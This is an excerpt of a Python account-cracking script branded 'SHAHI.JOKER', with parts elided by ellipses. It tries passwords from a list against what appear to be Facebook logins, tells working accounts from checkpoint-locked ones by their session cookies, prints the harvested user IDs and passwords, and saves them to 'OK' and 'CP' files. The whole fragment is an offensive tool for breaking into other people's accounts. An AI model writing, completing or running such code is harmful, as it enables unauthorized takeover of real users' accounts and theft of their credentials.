...
→   Github     :  SHAHI.JOKER
→   Tool Type  :  \x1b[1;95mSHAHI.JOKER
\x1b[1;97m→   Version    :  SHAHI.JOKER
\33[1;37m----------------------------------------------""")
    ...
    try:
        for ps in pwx:
            ...
            if 'u_user' in log_cookies:
                ...
                uid = coki[151:166]
                print('\033[1;32m[SHAHI.JOKER-OK] '+uid+'|'+ps+'\033[0;97m')
                open('SHAHI.JOKER-OK.txt', 'a').write(uid+' | '+ps+ '\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[141:152]
                print('\033[1;31m[SHAHI.JOKER-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('SHAHI.JOKER-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mSHAHI.JOKER\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
